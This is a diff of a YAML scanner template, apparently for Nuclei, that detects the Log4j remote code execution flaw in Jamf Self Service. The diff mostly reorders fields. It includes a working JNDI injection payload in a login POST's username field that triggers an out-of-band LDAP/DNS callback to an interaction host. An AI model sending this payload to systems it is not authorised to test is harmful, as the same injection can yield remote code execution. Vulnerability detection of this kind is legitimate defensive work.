@@ -1,4 +1,5 @@
 id: jamf-log4j-rce
+
 info:
   name: JamF (Log4j) - Remote Code Execution
   author: pdteam
@@ -17,46 +18,18 @@ info:
     cwe-id: CWE-77
     cpe: cpe:2.3:a:jamf:self_service:*:*:*:*:*:*:*:*
   metadata:
-    runzero-review: REJECT/2025-11-07/uses interactsh
-    max-request: 1
-    product: self_service
-    shodan-query: http.html:"JamF"
-    vendor: jamf
     verified: true
-  tags: cve,cve2021,jamf,jndi,kev,log4j,oast,rce,vuln
+    max-request: 1
+    shodan-query: http.html:"JamF"
+    product: self_service
+    vendor: jamf
+  tags: cve,cve2021,rce,jndi,log4j,jamf,oast,kev,vuln
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
+
 http:
-  - extractors:
-      - kval:
-          - interactsh_ip
-        type: kval
-      - group: 2
-        part: interactsh_request
-        regex:
-          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
-        type: regex
-      - group: 1
-        part: interactsh_request
-        regex:
-          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
-        type: regex
-    matchers:
-      - part: body
-        type: word
-        words:
-          - <title>Jamf Pro Login</title>
-      - part: interactsh_protocol
-        type: word
-        words:
-          - dns
-      - part: interactsh_request
-        regex:
-          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
-        type: regex
-    matchers-condition: and
-    raw:
+  - raw:
       - |
         POST / HTTP/1.1
         Host: {{Hostname}}
@@ -65,3 +38,38 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&password=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<title>Jamf Pro Login</title>'
+
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+# digest: 4a0a00473045022100b51527434d71d4271d6dae3c47f840ba9cb11a63e4f239cae5ae852047e9e57a02205a82c49dd11af643bde557a918ad460f6229507bb3ce3ebfdf69654e1154d272:922c64590222798bb761d5b6d8e72950
